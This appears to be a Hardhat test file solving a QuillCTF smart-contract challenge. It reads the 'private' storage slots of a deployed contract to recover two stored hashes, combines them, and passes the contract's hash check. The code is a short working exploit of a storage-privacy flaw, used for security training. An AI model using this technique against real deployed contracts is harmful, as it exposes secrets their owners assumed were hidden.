import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {ConfidentialHash} from '../../types/typechain';

describe('QuillCTF 3: Confidential Hash', () => {
  let owner: SignerWithAddress;
  let hash: string;

  let contract: ConfidentialHash;

  before(async () => {
    [owner] = await ethers.getSigners();
    contract = await ethers.getContractFactory('ConfidentialHash', owner).then(f => f.deploy());
    await contract.deployed();
  });

  it('should find the private variables', async () => {
    // 0x0 has firstUser string, which is a string that can fit in less than 32 bytes
    // 0x1 has uint256 alice age
    // 0x2 has the 32 byte alice private key
    // 0x3 has the 32 byte alice data
    // 0x4 has the 32 byte alice hash !!!
    const aliceHash: string = await ethers.provider.getStorageAt(contract.address, ethers.utils.hexValue(4));

    // 0x5 has secondUser string, which is a string that can fit in less than 32 bytes
    // 0x6 has uint256 bob age
    // 0x7 has the 32 byte bob private key
    // 0x8 has the 32 byte bob data
    // 0x9 has the 32 byte bob hash !!!
    const bobHash: string = await ethers.provider.getStorageAt(contract.address, ethers.utils.hexValue(9));

    // construct the hash as done in the contract via ethers.utils.solidityKeccak256
    hash = ethers.utils.solidityKeccak256(['bytes32', 'bytes32'], [aliceHash, bobHash]);
  });

  after(async () => {
    expect(await contract.checkthehash(hash)).to.be.true;
  });
});
